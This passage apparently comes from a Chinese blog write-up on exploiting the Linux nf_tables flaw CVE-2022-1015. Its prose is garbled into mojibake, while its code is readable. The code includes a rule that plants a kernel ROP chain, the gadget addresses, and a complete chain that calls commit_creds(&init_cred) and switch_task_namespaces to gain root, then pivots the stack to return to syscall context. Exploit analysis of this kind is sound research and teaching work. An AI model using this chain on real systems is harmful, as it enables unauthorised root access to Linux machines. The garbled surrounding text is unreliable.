chain&quot;</span>);<br></code></pre></td></tr></table></figure><p>è§¦å‘hookæ—¶çš„éƒ¨åˆ†è°ƒç”¨æ ˆ</p><img src="/2024/08/23/cve-2022-1015/stack.png" class title="stack"></li><li><p>å†™payloadè§„åˆ™ï¼šæŠŠROPé“¾å†™åˆ°æ ˆä¸Š</p><ul><li><p>ä¹‹å‰è®¡ç®—çš„payloadå¯å†™èŒƒå›´æ˜¯regså0x304â€”0x44få­—èŠ‚</p><img src="/2024/08/23/cve-2022-1015/range.png" class title="range"></li><li><p>è¿™é‡Œè¦†ç›–__netif_receive_skb_one_coreçš„è¿”å›åœ°å€</p><img src="/2024/08/23/cve-2022-1015/return.png" class title="return"><img src="/2024/08/23/cve-2022-1015/change_return.png" class title="change_return"><p><em>ä¸èƒ½ä»è¿”å›åœ°å€å‰å¼€å§‹è¿ç»­è¦†ç›–ï¼Œä¼šç ´åcanary</em></p></li><li><p>ç›®æ ‡åç§»0x398ï¼Œä¸‹æ ‡0xe6ï¼Œè®¡ç®—å¾—åˆ°çš„vuln_expr_paramsç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">$<span class="hljs-number">2</span> = &#123;<br>  min_len = <span class="hljs-number">0x68</span>,<br>  max_len = <span class="hljs-number">0xb8</span>,<br>  value = <span class="hljs-number">0xffffffea</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯å†™æœ€å¤§é•¿åº¦ä¸º0xb8ï¼Œä¹Ÿå°±æ˜¯23æ¡gadget</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">err = install_rop_chain_rule(nl, kernel_base, <span class="hljs-string">&quot;base_chain_2&quot;</span>, &amp;seq);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) <br>    error(<span class="hljs-string">&quot;[-] Could not install ROP chain&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">install_rop_chain_rule</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-type">uint64_t</span> kernel_base, <span class="hljs-type">char</span>* chain, <span class="hljs-type">int</span>* seq)</span><br>&#123;<br><span class="hljs-comment">// 1. return address is at regs.data[0xe6]</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vuln_expr_params</span> <span class="hljs-title">v</span>;</span><br>    <span class="hljs-keyword">if</span> (calc_vuln_expr_params(&amp;v, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xff</span>))        <span class="hljs-comment">// 0xca -&gt; 0xe6</span><br>        error(<span class="hljs-string">&quot;[-] Cannot find suitable parameters for planting ROP chain.&quot;</span>);  <br><span class="hljs-comment">// 2. write ROP chain (in the packet) at (0xca - 4)*4 = 0x318</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nftnl_rule</span>* <span class="hljs-title">r</span> =</span> build_rule(<span class="hljs-string">&quot;exploit_table&quot;</span>, chain, NFPROTO_IPV4, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);</span><br>    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, <span class="hljs-number">8</span>, v.max_len, v.value);<br>    <br><span class="hljs-comment">/* â€¦â€¦ */</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="ROPè¿‡ç¨‹"><a href="#ROPè¿‡ç¨‹" class="headerlink" title="ROPè¿‡ç¨‹"></a>ROPè¿‡ç¨‹</h4><h5 id="softirq"><a href="#softirq" class="headerlink" title="softirq"></a>softirq</h5><p>ç”±äºåˆ©ç”¨çš„æ˜¯inputçš„hookï¼Œæ‰€ä»¥è§¦å‘hookæ—¶ä¼šåœ¨è½¯ä¸­æ–­çš„ä¸Šä¸‹æ–‡ä¸­</p><p>å…ˆçœ‹è°ƒç”¨æ ˆï¼Œåœ¨ip_finish_output2ä¸­ä½¿èƒ½ååŠéƒ¨local_bh_enableæ—¶ä¼šæ£€æŸ¥æ˜¯å¦æœ‰æœªå¤„ç†çš„è½¯ä¸­æ–­å¹¶è¿›è¡Œå¤„ç†</p><img src="/2024/08/23/cve-2022-1015/stack1.png" class title="stack1"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __local_bh_enable_ip(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cnt)<br>&#123;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br><span class="hljs-keyword">if</span> (unlikely(!in_interrupt() &amp;&amp; local_softirq_pending())) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Run softirq if any pending. And do it in its own stack</span><br><span class="hljs-comment"> * as we may be calling this deep in a task call stack already.</span><br><span class="hljs-comment"> */</span><br>do_softirq();<br>&#125;<br><span class="hljs-comment">/* â€¦â€¦  */</span><br>&#125;<br>EXPORT_SYMBOL(__local_bh_enable_ip);<br></code></pre></td></tr></table></figure><p>çœ‹çœ‹do_softirqçš„è¿‡ç¨‹</p><ul><li><p>åˆ¤æ–­æ˜¯å¦å¤„äºç¡¬ä¸­æ–­ä¸­</p><ul><li>åœ¨ç¡¬ä¸­æ–­å¤„ç†å‡½æ•°é€€å‡ºæ—¶ä¼šè°ƒç”¨irq_exitå¤„ç†è½¯ä¸­æ–­</li><li>æˆ–å½“å‰è½¯ä¸­æ–­è¢«ç¦ç”¨</li></ul><p>æ²¡å¿…è¦å¤„ç†è½¯ä¸­æ–­ï¼Œç›´æ¥è¿”å›</p></li><li><p>ä¿æŒä¸­æ–­å¯„å­˜å™¨çš„çŠ¶æ€å¹¶ç¦ç”¨æœ¬åœ°CPUçš„ä¸­æ–­</p></li><li><p>å–å¾—å½“å‰CPUä¸Š__softirq_pendingå­—æ®µï¼Œè·å–æœ¬åœ°CPUä¸ŠæŒ‚èµ·çš„è½¯ä¸­æ–­</p></li><li><p>å¦‚æœå½“å‰CPUä¸Šæœ‰æŒ‚èµ·çš„è½¯ä¸­æ–­ï¼Œæ‰§è¡Œ__do_softirq()æ¥å¤„ç†è½¯ä¸­æ–­</p></li><li><p>æ¢å¤ä¸­æ–­å¯„å­˜å™¨çš„çŠ¶æ€</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage __visible <span class="hljs-type">void</span> <span class="hljs-title function_">do_softirq</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>__u32 pending;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>    <span class="hljs-comment">// [1]</span><br><span class="hljs-keyword">if</span> (in_interrupt())<br><span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">// [2]</span><br>local_irq_save(flags);<br><br>    <span class="hljs-comment">// [3]</span><br>pending = local_softirq_pending();<br><br>    <span class="hljs-comment">// [4]</span><br><span class="hljs-keyword">if</span> (pending &amp;&amp; !ksoftirqd_running(pending))<br>do_softirq_own_stack();<br><br>    <span class="hljs-comment">// [5]</span><br>local_irq_restore(flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>do_softirq_own_stackä¼šåœ¨å¦å¤–çš„æ ˆä¸Šæ‰§è¡Œ__do_softirqï¼Œæ ˆé¡¶å¦‚ä¸‹å›¾ğŸ‘‡</p><img src="/2024/08/23/cve-2022-1015/return2syscall.png" class title="return2syscall"><p>__do_softirqæµç¨‹</p><ul><li>é€šè¿‡å–å½“å‰CPUä¸Šçš„__softirq_pendingå­—æ®µï¼Œè·å–å½“å‰CPUä¸ŠæŒ‚èµ·çš„è½¯ä¸­æ–­</li><li>æ¸…ç©ºæœ¬åœ°CPUçš„__softirq_pendingå­—æ®µ</li><li>å¼€å¯æœ¬åœ°CPUçš„ç¡¬ä¸­æ–­</li><li>å¾ªç¯æ‰§è¡Œè¢«æŒ‚èµ·çš„è½¯ä¸­æ–­å¤„ç†å‡½æ•°</li><li>å¤„ç†inputç½‘ç»œåŒ…çš„net_rx_actionåœ¨è¿™é‡Œæ‰§è¡Œ</li><li>ç¦ç”¨æœ¬åœ°CPUçš„ç¡¬ä¸­æ–­</li><li>å”¤é†’ksoftirqå†…æ ¸çº¿ç¨‹æ¥å¤„ç†è½¯ä¸­æ–­</li><li>è°ƒæ•´preempt countï¼Œè¿™ä¸ªå˜é‡ç”¨äºè®°å½•ä¸Šä¸‹æ–‡ï¼Œæ¯”å¦‚ï¼šè½¯ä¸­æ–­ä¸Šä¸‹æ–‡ã€ç¡¬ä¸­æ–­ä¸Šä¸‹æ–‡</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">asmlinkage __visible <span class="hljs-type">void</span> __softirq_entry __do_softirq(<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end = jiffies + MAX_SOFTIRQ_TIME;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> old_flags = current-&gt;flags;<br><span class="hljs-type">int</span> max_restart = MAX_SOFTIRQ_RESTART;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">softirq_action</span> *<span class="hljs-title">h</span>;</span><br><span class="hljs-type">bool</span> in_hardirq;<br>__u32 pending;<br><span class="hljs-type">int</span> softirq_bit;<br><br>current-&gt;flags &amp;= ~PF_MEMALLOC;<br><br>    <span class="hljs-comment">// [1]</span><br>pending = local_softirq_pending();<br><br>   <span class="hljs-comment">/* â€¦â€¦ */</span><br>    <br>restart:<br><span class="hljs-comment">// [2]</span><br>set_softirq_pending(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// [3]</span><br>local_irq_enable();<br><span class="hljs-comment">// [4]</span><br>h = softirq_vec;<br><br><span class="hljs-keyword">while</span> ((softirq_bit = ffs(pending))) &#123;<br>        <br>        <span class="hljs-comment">/* â€¦â€¦ */</span><br>        <br>trace_softirq_entry(vec_nr);<br>h-&gt;action(h);<span class="hljs-comment">// [5]</span><br>trace_softirq_exit(vec_nr);<br>        <br><span class="hljs-comment">/* â€¦â€¦ */</span><br>        <br>pending &gt;&gt;= softirq_bit;<br>&#125;<br><br><span class="hljs-comment">/* â€¦â€¦ */</span><br><br>    <span class="hljs-comment">// [6]</span><br>local_irq_disable();<br><br>    <span class="hljs-comment">// [7]</span><br>pending = local_softirq_pending();<br><span class="hljs-keyword">if</span> (pending) &#123;<br><span class="hljs-keyword">if</span> (time_before(jiffies, end) &amp;&amp; !need_resched() &amp;&amp;<br>    --max_restart)<br><span class="hljs-keyword">goto</span> restart;<br><br>wakeup_softirqd();<br>&#125;<br><br>account_softirq_exit(current);<br>lockdep_softirq_end(in_hardirq);<br>softirq_handle_end();<span class="hljs-comment">// [8]</span><br>current_restore_flags(old_flags, PF_MEMALLOC);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ç¦»å¼€softirqä¸Šä¸‹æ–‡"><a href="#ç¦»å¼€softirqä¸Šä¸‹æ–‡" class="headerlink" title="ç¦»å¼€softirqä¸Šä¸‹æ–‡"></a>ç¦»å¼€softirqä¸Šä¸‹æ–‡</h5><p>éœ€è¦æ¨¡æ‹Ÿpending softirqå¤„ç†å®Œçš„æµç¨‹</p><ul><li>è°ƒç”¨local_irq_disableç¦ç”¨ç¡¬ä¸­æ–­</li><li>è°ƒç”¨softirq_handle_endè°ƒæ•´preempt count</li></ul><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¨¡æ‹Ÿè¿™ä¸€è¿‡ç¨‹</p><ul><li>åˆ©ç”¨<code>cli; ret;</code>gadgetæ¥æ‰§è¡Œlocal_irq_disable</li><li>ç”±äºsoftirq_handle_endæ˜¯å†…è”å®ç°ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨__do_softirqä¸­æ‰§è¡Œï¼Œè·³è¿‡wakeup_softirqäº‹åŠ¡</li></ul><p>ææƒåå†æŠŠæ ˆæŠ¬è‡³do_softirqæ ˆé¡¶å°±èƒ½ä¼˜é›…åœ°å›åˆ°syscallä¸Šä¸‹æ–‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff8200019a &lt;+410&gt;:   call   0xffffffff810a8f30 &lt;wakeup_softirqd&gt;<br>0xffffffff8200019f &lt;+415&gt;:   add    DWORD PTR gs:[rip+0x7e01f9d6],0xffffff00        # 0x1fb80 &lt;__preempt_count&gt;                                                                                    <br>0xffffffff820001aa &lt;+426&gt;:   mov    eax,DWORD PTR gs:[rip+0x7e01f9cf]        # 0x1fb80 &lt;__preempt_count&gt;                                                                                           <br>0xffffffff820001b1 &lt;+433&gt;:   test   eax,0xffff00<br>0xffffffff820001b6 &lt;+438&gt;:   jne    0xffffffff8200028b &lt;__do_softirq+651&gt;<br>0xffffffff820001bc &lt;+444&gt;:   mov    edx,DWORD PTR [rbp-0x4c]<br>0xffffffff820001bf &lt;+447&gt;:   mov    rax,QWORD PTR gs:0x1fbc0<br>0xffffffff820001c8 &lt;+456&gt;:   and    edx,0x800<br>0xffffffff820001ce &lt;+462&gt;:   and    DWORD PTR [rax+0x2c],0xfffff7ff<br>0xffffffff820001d5 &lt;+469&gt;:   or     DWORD PTR [rax+0x2c],edx<br>0xffffffff820001d8 &lt;+472&gt;:   add    rsp,0x28<br>0xffffffff820001dc &lt;+476&gt;:   pop    rbx<br>0xffffffff820001dd &lt;+477&gt;:   pop    r12<br>0xffffffff820001df &lt;+479&gt;:   pop    r13<br>0xffffffff820001e1 &lt;+481&gt;:   pop    r14<br>0xffffffff820001e3 &lt;+483&gt;:   pop    r15<br>0xffffffff820001e5 &lt;+485&gt;:   pop    rbp<br>0xffffffff820001e6 &lt;+486&gt;:   ret<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ä¼ªé€ rbpï¼Œç¡®ä¿rbp-0x58æŒ‡å‘çš„å€¼ä¸º0x400100</p><h5 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h5><p>ææƒæ­¥éª¤</p><ul><li>bpf_get_current_taskè·å–å½“å‰è¿›ç¨‹çš„tack_struct current</li><li>switch_task_namespaces(current, &amp;init_nsproxy)</li><li>commit_creds(&amp;init_cred)</li><li>æŠ¬æ ˆè¿”å›syscallä¸Šä¸‹æ–‡</li></ul><h4 id="ROPé“¾"><a href="#ROPé“¾" class="headerlink" title="ROPé“¾"></a>ROPé“¾</h4><p>ä¹‹å‰è®¡ç®—å‡ºå¯ä»¥å†™23æ¡gadget</p><ul><li><p>ç¦»å¼€softirqä¸Šä¸‹æ–‡éœ€è¦4æ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff8106a918: cli; ret;<br>0xffffffff810006b7: pop rbp; ret;<br>0xffffffff822c1df2: &lt;serial_pci_tbl+4850&gt;:0x0000000040010000<br>0xffffffff8200019f: &lt;__do_softirq+415&gt;<br></code></pre></td></tr></table></figure></li><li><p>__do_softirqæœ«å°¾çš„è°ƒæ ˆéœ€è¦11æ¡å¡«å……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff820001d8 &lt;+472&gt;:   add    rsp,0x28<br>0xffffffff820001dc &lt;+476&gt;:   pop    rbx<br>0xffffffff820001dd &lt;+477&gt;:   pop    r12<br>0xffffffff820001df &lt;+479&gt;:   pop    r13<br>0xffffffff820001e1 &lt;+481&gt;:   pop    r14<br>0xffffffff820001e3 &lt;+483&gt;:   pop    r15<br>0xffffffff820001e5 &lt;+485&gt;:   pop    rbp<br>0xffffffff820001e6 &lt;+486&gt;:   ret<br></code></pre></td></tr></table></figure></li><li><p>è¿˜å‰©8æ¡ï¼Œä½†ææƒè¿”å›syscallä¸Šä¸‹æ–‡éœ€è¦11æ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff811ef7e0: bpf_get_current_task<br>0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;<br>0xdeadbeef<br>0xdeadbeef<br>0xffffffff810223e6: pop rsi; ret;<br>0xffffffff8286d940:init_nsproxy<br>0xffffffff810d12b0:switch_task_namespaces<br>0xffffffff81092100: pop rdi; ret;<br>0xffffffff8286db80:init_cred<br>0xffffffff810d2690:commit_creds<br>0xffffffff8128e2c4: add rsp, 0xd8; pop r12; pop rbp; ret;<br></code></pre></td></tr></table></figure></li></ul><p>å¯ä»¥æŠŠææƒçš„gadgetså¡è¿›__do_softirqæœ«å°¾è°ƒæ ˆçš„11æ¡å¡«å……é‡Œï¼Œç„¶åç”¨8æ¡gadgetæŠŠæ ˆæ¬è¿‡å»</p><p><em>ç”±äºæ˜¯è‡ªå·±é‡ç¼–çš„å†…æ ¸ï¼Œæ‰€ä»¥ç°æˆçš„expé‡Œæœ‰ä¸ªgadgetæ²¡æœ‰ï¼Œè‡ªå·±é‡æ“äº†ä¸€ç»„ï¼Œæ€è·¯æ˜¯ä¸€æ ·çš„</em></p><p>å¤§è‡´æ€è·¯</p><ul><li>é€šè¿‡push rspå†popå°†rspçš„å€¼å­˜å…¥æŸä¸ªå¯„å­˜å™¨ï¼ˆå¦‚r13ï¼‰</li><li>æœ‰å¯æ§å¯„å­˜å™¨raxï¼ˆå¦‚pop rax; ret;ï¼‰</li><li>sub r13, rax; ret;</li><li>å†é€šè¿‡push r13; pop rsp;æ§åˆ¶rsp</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0xffffffff814ec181: push rsp; and eax, 0x5c415b0c; pop r13; pop rbp; ret;<br>0xdeadbeef<br>0xffffffff81064650: pop rax; ret;<br>0x68<br>0xffffffff812847f9: sub r13, rax; mov rax, r13; pop r13; pop rbp; ret;<br>0xdeadbeef<br>0xdeadbeef<br>0xffffffff8164cfba: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;<br></code></pre></td></tr></table></figure><p>å®Œæ•´ROPé“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">// 0xffffffff8106a918: cli; ret;</span><br>_rop(kernel_base + CLI_OFF);<br><br>   <span class="hljs-comment">// make rbp-0x58 point to 0x40010000</span><br><span class="hljs-comment">// 0xffffffff810006b7: pop rbp; ret;</span><br>   _rop(kernel_base + POP_RBP_OFF);<br><span class="hljs-comment">// 0xffffffff822c1df2 &lt;serial_pci_tbl+4850&gt;:0x0000000040010000</span><br>   _rop(kernel_base + OLD_TASK_FLAGS_OFF + <span class="hljs-number">0x58</span>)<br>       <br>   <span class="hljs-comment">// Cleanly exit softirq and return to syscall context</span><br><span class="hljs-comment">// ffffffff82000000 T __do_softirq</span><br>   _rop(kernel_base + __DO_SOFTIRQ_OFF + <span class="hljs-number">415</span>);<br><br>   <span class="hljs-comment">// switch_task_namespaces(current, &amp;init_nsproxy)</span><br><span class="hljs-comment">// ffffffff811ef7e0 T bpf_get_current_task</span><br>   _rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);<br><span class="hljs-comment">// 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;</span><br>   _rop(kernel_base + MOV_RDI_RAX_OFF);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br><span class="hljs-comment">// 0xffffffff810223e6: pop rsi; ret;</span><br>   _rop(kernel_base + POP_RSI_OFF);<br><span class="hljs-comment">// ffffffff8286d940 D init_nsproxy</span><br>   _rop(kernel_base + INIT_NSPROXY_OFF);<br><span class="hljs-comment">// ffffffff810d12b0 T switch_task_namespaces</span><br>   _rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);<br><br>   <span class="hljs-comment">// commit_cred(&amp;init_cred)</span><br><span class="hljs-comment">// 0xffffffff81092100: pop rdi; ret;</span><br>   _rop(kernel_base + POP_RDI_OFF);<br><span class="hljs-comment">// ffffffff8286db80 D init_cred</span><br>   _rop(kernel_base + INIT_CRED_OFF);<br><span class="hljs-comment">// ffffffff810d2690 T commit_creds</span><br>   _rop(kernel_base + COMMIT_CREDS_OFF);<br><br>   <span class="hljs-comment">// pass control to system call stack</span><br><span class="hljs-comment">// 0xffffffff8128e2c4 : add rsp, 0xd8 ; pop r12 ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x28e2c4</span>);<br><br><span class="hljs-comment">// jump to j1</span><br><span class="hljs-comment">// 0xffffffff814ec181 : push rsp ; and eax, 0x5c415b0c ; pop r13 ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x4ec181</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br><span class="hljs-comment">// 0xffffffff81064650 : pop rax ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x64650</span>);<br>   _rop(<span class="hljs-number">0x68</span>);<br><span class="hljs-comment">// 0xffffffff812847f9 : sub r13, rax ; mov rax, r13 ; pop r13 ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x2847f9</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br>   _rop(<span class="hljs-number">0xdeadbeef</span>);<br><span class="hljs-comment">// 0xffffffff8164cfba : push rax ; add eax, 0x74030000 ; add al, 0x41 ; pop rsp ; pop rbp ; ret</span><br>   _rop(kernel_base + <span class="hljs-number">0x64cfba</span>);<br></code></pre></td></tr></table></figure><img src="/2024/08/23/cve-2022-1015/success.png" class title="success"><h1 id="ä¸€äº›å°è¯•"><a href="#ä¸€äº›å°è¯•" class="headerlink" title="ä¸€äº›å°è¯•"></a>ä¸€äº›å°è¯•</h1><h2 id="åˆ«çš„Leakæ–¹æ³•"><a href="#åˆ«çš„Leakæ–¹æ³•" class="headerlink" title="åˆ«çš„Leakæ–¹æ³•"></a>åˆ«çš„Leakæ–¹æ³•</h2><h3 id="nft-payload-set"><a href="#nft-payload-set" class="headerlink" title="nft_payload_set"></a>nft_payload_set</h3><p>åœ¨çœ‹æºç çš„æ—¶å€™å‘ç°ä¸€ä¸ªä¸œè¥¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_payload_set</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_payload_bases</span><span class="hljs-title">base</span>:</span><span class="hljs-number">8</span>;<br>u8offset;<br>u8len;<br>u8sreg;<br>u8csum_type;<br>u8csum_offset;<br>u8csum_flags;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_expr_ops</span> <span class="hljs-title">nft_payload_set_ops</span> =</span> &#123;<br>.type= &amp;nft_payload_type,<br>.size= NFT_EXPR_SIZE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> nft_payload_set)),<br>.eval= nft_payload_set_eval,<br>.init= nft_payload_set_init,<br>.dump= nft_payload_set_dump,<br>.reduce= nft_payload_set_reduce,<br>&#125;;<br></code></pre></td></tr></table></figure><p>çœ‹æºç åƒæ˜¯å¯ä»¥æŠŠå¯„å­˜å™¨çš„å€¼å†™å…¥packetï¼Œnft_payload_select_opsä¸­å¦‚æœè®¾ç½®äº†sregæ²¡è®¾ç½®dregå°±ä¼šè¿”å›è¿™ä¸ªnft_payload_set_ops</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (tb[NFTA_PAYLOAD_SREG] != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">if</span> (tb[NFTA_PAYLOAD_DREG] != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">return</span> 